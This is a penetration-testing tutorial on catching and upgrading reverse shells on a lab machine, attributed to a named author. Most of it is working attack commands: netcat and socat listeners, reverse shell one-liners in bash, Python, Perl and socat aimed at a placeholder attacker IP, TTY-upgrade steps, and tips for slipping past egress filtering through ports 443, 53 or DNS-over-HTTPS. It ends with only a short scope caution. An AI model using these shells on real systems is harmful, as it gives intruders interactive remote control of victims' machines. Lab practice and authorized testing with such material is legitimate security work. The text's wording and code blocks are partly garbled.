# HOW TO SETUP & TEST A REVERSE SHELL STAGE ON YOUR LAB TARGET (2026 expert guide)
> **Author:** MD MAHABUBUR RAHMAN
These guidance focus on the LEGIT part: running a listener & proving the shell works (your own box).

## The N ways to test (your lab)
1. Listener choice: nc -lvnp, socat, rlwrap nc for PTY, metasploit handler.
2. PTY upgrade on the target after bind: python/script 2>&1, stty raw.
3. Multi-handler: one listener per language (netcat vs socat vs msf).
4. Bind vs reverse: reverse = target dials you (works with NAT outbound); bind = you dial target.
5. Firewall test: ip/port filter on which direction you open (often only reverse allowed).
6. Payload env test on the box (bash, python3, perl, php, nc) - then pick matching shell.
7. Encrypted tunnels: openssl s_client, socat OPENSSL, auto ssh remap.

## Step-by-step on target (own box)
1. Start your listener:
```
   nc -lvnp 4444
for PTY:  socat file:`tty`,raw,echo=0 tcp-listen:4444
```
2. Send the matching shell from the box (see Reverse_Shells + php-reverse-shell folders).
3. Confirm: `id`, `whoami`, `/bin/sh -i` prompt, output visible.
4. Upgrade to interactive TTY if only bash:
```
   python3 -c 'import pty;pty.spawn("/bin/bash")';  Ctrl-Z; stty raw -echo; fg; reset; export TERM=xterm
```
5. If dropped/filtered: try 443, 53, 80 outbound, or use socat/ssh reverse tunnel.

## Worked examples (concrete)
```
nc -lvnp 4444
target (if you have a shell already):
```
bash -i >& /dev/tcp/YOUR-IP/4444 0>&1
```
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
perl -e 'use Socket;$i="YOUR-IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")}'
PTY upgrade:
python3 -c 'import pty;pty.spawn("/bin/bash")'   ;  Ctrl-Z  ;  stty raw -echo; fg  ;  export TERM=xterm; clear
socat listener with PTY:
socat file:`tty`,raw,echo=0 tcp-listen:4444
target side socat:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR-IP:4444
over 443:
nc -lvnp 443   # target: bash -i >& /dev/tcp/YOUR-IP/443 0>&1
```

## Errors debug table
- "connection refused" = listener not open / wrong port.
- "command not found" = that shell not on box; switch language.
- Shell opens but dies instantly = payload quoting broke; retry without quote-wrapping.
- Timeout = egress blocked; switch protocol/port or use DNS-over-https reverse.

## False positives / caution
- Always test against YOUR lab listener; never against production boxes without scope.
- A reverse shell used on a real target is out-of-scope unless the program says "RCE" in box (assume not).
